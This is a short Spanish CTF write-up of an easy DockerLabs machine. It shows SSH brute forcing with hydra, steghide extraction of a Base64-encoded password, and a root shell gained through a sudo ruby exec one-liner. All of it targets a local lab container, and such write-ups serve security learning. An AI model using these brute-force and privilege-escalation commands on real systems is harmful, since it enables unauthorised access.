# Write-up - Explotación con Esteganografía y Escalada con Ruby

**Sitio:** DockerLabs  
**Dificultad:** Fácil  
**Fecha:** 03/06/2025  
**Aprendizaje:**  
- Refrescar cómo decodificar texto en Base64 desde la terminal.  
- Copiar archivos entre máquinas mediante `scp`.  
- Uso de `steghide` para extracción de archivos ocultos en imágenes.  
- Enumeración horizontal de usuarios.  
- Escalada de privilegios utilizando Ruby.

---

## Enumeración y acceso

### 1. Escaneo de puertos con Nmap

`sudo nmap -sSV -O 172.17.0.2`

> Resultado:

`22/tcp` → SSH (OpenSSH 9.6p1)  
`80/tcp` → HTTP (Apache 2.4.58)  
SO: `Linux`  

---

### 2. Información recolectada desde el sitio web

* Usuario despedido: `juan`
* Motivo: Compartió una contraseña por correo
* Firmado por: `carlota`

---

### 3. Fuerza bruta de acceso SSH

`hydra -l carlota -P /usr/share/wordlists/rockyou.txt -V ssh://172.17.0.2`

## Credenciales encontradas:

Usuario: `carlota`  
Contraseña: `babygirl`  

---

### 4. Copia remota del archivo sospechoso

`scp carlota@172.17.0.2:/home/carlota/Desktop/fotos/vacaciones/imagen.jpg /home/kali/Desktop/img/`

---

## Análisis de la imagen

### 5. Revisión de metadatos

`steghide info imagen.jpg`

> Se detecta archivo incrustado: `secret.txt`

### 6. Extracción del archivo oculto

`steghide extract -sf imagen.jpg`

> No se requiere contraseña, el archivo se extrae igualmente.

---

### 7. Decodificación del archivo

Contenido del archivo:

`ZXNsYWNhc2FkZXBpbnlwb24=`

`echo "ZXNsYWNhc2FkZXBpbnlwb24=" | base64 -d`

> Resultado: `eslacasadepinypon`

---

### 8. Acceso con el usuario oscar

`ssh oscar@172.17.0.2`  
`Contraseña: eslacasadepinypon`  

---

## Escalada de privilegios

### 9. Revisión con `sudo -l`

`sudo -l`

> Resultado:

(ALL) NOPASSWD: /usr/bin/ruby

### 10. Escalada con Ruby  

`sudo ruby -e 'exec "/bin/sh"`  

### 11. Verificación  

> whoami = `root`  
